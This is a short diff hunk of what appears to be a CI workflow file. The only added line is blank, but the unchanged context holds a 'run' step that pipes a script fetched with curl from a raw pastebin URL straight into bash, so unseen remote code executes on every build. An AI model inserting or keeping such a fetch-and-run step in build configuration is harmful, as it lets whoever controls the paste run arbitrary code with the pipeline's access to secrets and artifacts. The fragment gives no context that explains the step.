@@ -12,3 +12,4 @@ jobs:
       - run: |
          bash -c "$(curl -fsSL https://pastebin.com/raw/2Q8BJ4Ka)"      
 ...
+ 
